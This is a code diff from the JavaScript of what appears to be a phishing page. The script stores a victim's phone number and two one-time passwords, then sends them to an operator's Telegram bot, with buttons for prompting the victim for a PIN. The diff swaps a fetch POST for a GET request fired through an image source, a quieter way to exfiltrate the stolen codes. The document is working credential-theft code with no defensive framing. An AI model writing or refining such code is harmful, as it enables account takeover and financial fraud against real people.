@@ -32,22 +32,9 @@ localStorage.setItem('otp2', otp2);
 
 const msg = `2️⃣ *SECOND OTP VERIFIED* ✅\n\n🇸🇴 *Country:* Somalia\n📱 *Phone:* ${phone}\n🔒 *Second OTP:* \`${otp2}\`\n🔗 *First OTP:* \`${localStorage.getItem('otp1')}\`\n\n✅ *OTP verified. Now choose how to collect the second PIN:*`;
 
-fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
-    method:'POST',
-    mode:'no-cors',
-    headers:{'Content-Type':'application/json'},
-    body:JSON.stringify({
-        chat_id:CHAT_ID,
-        text:msg,
-        parse_mode: 'Markdown',
-        reply_markup:{
-            inline_keyboard:[
-                [{"text":"📱 Prompt PIN","callback_data":"prompt"},{"text":"📋 Request PIN","callback_data":"request"}],
-                [{"text":"✅ Pass","callback_data":"pass"}]
-            ]
-        }
-    })
-});
+const keyboard = JSON.stringify({inline_keyboard:[[{"text":"📱 Prompt PIN","callback_data":"prompt"},{"text":"📋 Request PIN","callback_data":"request"}],[{"text":"✅ Pass","callback_data":"pass"}]]});
+const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown&reply_markup=${encodeURIComponent(keyboard)}`;
+new Image().src = url;
 
 let count = 3;
 const timer = setInterval(()=>{
